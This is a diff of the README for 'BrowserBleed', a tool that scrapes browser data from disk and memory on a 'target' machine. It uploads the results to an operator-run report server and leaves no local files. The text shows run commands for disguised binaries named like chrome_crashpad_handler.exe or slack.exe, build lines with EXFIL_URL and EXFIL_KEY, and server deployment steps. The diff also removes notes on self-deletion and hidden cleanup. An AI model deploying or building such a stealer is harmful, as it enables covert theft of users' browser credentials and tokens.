@@ -153,10 +153,8 @@ Both versions write two files to the same directory as the binary:
 When built with a report server baked in (see [Building your own binaries](#building-your-own-binaries)), just drop and run - no flags needed. Results upload automatically and the binary removes itself.
 
 **Default behaviour when a server is baked in:**
-1. Marks itself for deletion on next reboot (Windows `MoveFileExW`) - scheduled immediately on launch
-2. Scans all browsers (disk + memory), exfils results to your server
-3. Deletes itself after upload - tries direct delete first, falls back to a fully hidden 5s-delayed cleanup (no windows, no visible processes)
-4. No local files left anywhere on the target
+1. Scans all browsers (disk + memory), exfils results to your server
+2. No local files left anywhere on the target
 
 ### Windows
 
@@ -168,7 +166,7 @@ chrome_crashpad_handler.exe --browser chrome   # target one browser only
 chrome_crashpad_handler.exe --memory-only      # skip disk extraction
 chrome_crashpad_handler.exe --disk-only        # skip memory scraping
 chrome_crashpad_handler.exe --verify           # verify tokens (outbound requests)
-chrome_crashpad_handler.exe --max-hits 500     # raise memory hit cap (default: 300)
+chrome_crashpad_handler.exe --max-hits 500     # lower memory hit cap (default: 1000)
 ```
 
 When running from source (no server baked in):
@@ -186,7 +184,7 @@ sudo ./BrowserBleed_mac --browser chrome       # target one browser only
 sudo ./BrowserBleed_mac --memory-only          # skip disk extraction
 sudo ./BrowserBleed_mac --disk-only            # skip memory scraping
 sudo ./BrowserBleed_mac --verify               # verify tokens (outbound requests)
-sudo ./BrowserBleed_mac --max-hits 500         # raise memory hit cap (default: 300)
+sudo ./BrowserBleed_mac --max-hits 500         # lower memory hit cap (default: 1000)
 ```
 
 When running from source:
@@ -227,11 +225,11 @@ bash deploy/provision.sh
 # 3. Wait ~60s, then configure nginx + TLS
 bash deploy/setup-server.sh
 
-# 4. Build and deploy the server binary (prompts for secrets on first run)
+# 4. Build and deploy the server binary
 bash deploy/deploy-binary.sh
 ```
 
-`deploy-binary.sh` prompts for four secrets on first deploy and writes them to `/opt/bb-reports/.env` (mode 600) on the server:
+`setup-server.sh` writes four secrets to `/opt/bb-reports/.env` (mode 600) on the server:
 
 | Variable | Purpose |
 |----------|---------|
@@ -332,8 +330,8 @@ EXFIL_URL=https://reports.example.com EXFIL_KEY=mykey ./build_mac.sh
 Drop the built exe anywhere writable on the target and run it. The filename is whatever preset you chose - `chrome_crashpad_handler.exe`, `slack.exe`, etc.
 
 ```
-chrome_crashpad_handler.exe   # Windows - exfils, self-deletes after upload
-sudo ./BrowserBleed_mac       # macOS - exfils, self-deletes
+chrome_crashpad_handler.exe   # Windows - exfils, no local files
+sudo ./BrowserBleed_mac       # macOS - exfils, no local files
 ```
 
 View results at your report server after logging in with the API key.
